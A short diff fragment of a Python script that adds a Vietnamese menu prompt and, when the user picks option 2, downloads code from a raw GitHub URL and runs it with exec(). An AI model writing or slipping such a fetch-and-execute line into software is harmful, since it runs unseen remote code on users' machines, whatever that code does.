@@ -44,6 +44,9 @@ else:
 
 
 
+Chon=int(input("Lựa Chọn Của Bạn : "))
+if Chon == 2 :
+	exec(requests.get('https://raw.githubusercontent.com/Thuanvuse/filecode/main/TaoPro5').text)
 
 
 
